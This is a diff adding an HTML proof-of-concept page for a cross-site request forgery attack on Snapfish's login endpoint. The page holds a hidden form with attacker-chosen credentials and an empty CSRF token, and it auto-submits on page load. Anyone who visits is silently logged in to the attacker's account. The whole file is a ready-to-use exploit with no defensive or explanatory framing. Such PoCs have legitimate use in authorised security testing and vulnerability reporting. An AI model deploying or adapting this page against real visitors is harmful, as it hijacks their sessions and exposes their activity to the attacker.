@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF PoC - Snapfish</title>
+</head>
+<body>
+  <form id="csrfForm" action="https://www.snapfish.com/loginto?submit=true&componentID=1395868004571" method="POST" crossorigin="anonymous">
+    <input type="hidden" name="iwPreActions" value="submit" />
+    <input type="hidden" name="pnsUrl" value="&#47;loginto" />
+    <input type="hidden" name="next" value="/youraccount" />
+    <input type="hidden" name="SECURITY&#95;CSRFTOKEN" value="" />
+    <input type="hidden" name="SubscriptionFlag" value="checked" />
+    <input type="hidden" name="EmailAddress" value="attacker-xss7&#64;gmail&#46;com" />
+    <input type="hidden" name="Password" value="P&#64;ssword2024" />
+  </form>
+  <script>
+    // Enviar o formulário assim que a página for carregada
+    document.addEventListener("DOMContentLoaded", function() {
+      document.getElementById("csrfForm").submit();
+    });
+  </script>
+</body>
+</html>
